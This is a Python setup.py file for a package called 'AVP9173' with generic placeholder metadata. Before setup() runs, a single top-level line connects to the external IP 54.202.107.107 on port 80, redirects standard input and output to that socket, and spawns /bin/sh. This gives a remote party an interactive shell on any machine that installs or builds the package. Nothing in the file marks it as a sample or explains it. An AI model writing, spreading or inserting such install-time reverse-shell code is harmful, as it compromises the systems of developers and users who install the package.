from setuptools import setup
import socket,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.202.107.107",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")


setup(
   name='AVP9173',
   version='0.1.0',
   author='Some person',
   author_email='aac@example.com',
   description='An awesome package that does something',
)
